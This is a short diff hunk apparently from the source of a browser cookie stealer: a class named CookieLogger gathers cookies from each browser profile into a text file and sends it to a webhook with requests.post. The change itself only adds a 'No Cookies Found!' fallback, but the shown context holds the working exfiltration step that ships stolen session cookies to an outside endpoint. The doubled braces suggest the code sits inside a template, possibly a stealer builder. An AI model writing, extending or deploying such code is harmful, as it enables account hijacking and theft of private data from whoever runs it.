@@ -61,7 +61,9 @@ class CookieLogger:
 
             for _cookie in cookie[1]:
                 cookieDoc += f"Browser: {{cookie[0]}}\\nProfile: {{_cookie[0]}}\\nCookie: {{_cookie[1]}}\\n\\n"
-
+                
+        if not cookieDoc: cookieDoc = "No Cookies Found!"
+        
         requests.post(webhook, files = {{"cookies.txt": cookieDoc}})
     
     @safe
